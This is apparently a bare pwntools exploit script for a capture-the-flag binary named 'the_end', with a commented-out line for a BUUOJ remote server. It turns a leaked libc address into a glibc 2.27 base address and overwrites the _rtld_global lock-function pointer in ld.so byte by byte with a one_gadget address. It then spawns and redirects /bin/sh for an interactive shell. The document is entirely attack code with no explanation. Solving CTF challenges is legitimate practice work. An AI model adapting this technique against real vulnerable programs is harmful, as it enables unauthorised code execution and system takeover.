from pwn import *

io = process("./the_end")
#io = remote('node4.buuoj.cn', 29364)
elf = ELF("./the_end")
libc = elf.libc
ld = ELF("../../../glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so")

def debug():
        gdb.attach(io)
        pause()

io.recvuntil(b'here is a gift ')
libc_base = int(io.recvuntil(b',', drop = True), 16) - libc.symbols['sleep']
print("libc_base:", hex(libc_base))


"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
0x4f322 execve("/bin/sh", rsp+0x40, environ)
0x10a38c execve("/bin/sh", rsp+0x70, environ)
"""

one_gadget = libc_base + 0x4f322
ld_base = libc_base + 0x3f1000
dl_rtld_lock_recursive_addr = ld_base + ld.symbols['_rtld_global'] + 0xf08

for i in range(5):
	io.send(p64(dl_rtld_lock_recursive_addr+i))
	io.send(p8(p64(one_gadget)[i]))
	#debug()

io.sendline("exec /bin/sh 1>&0")
io.interactive()
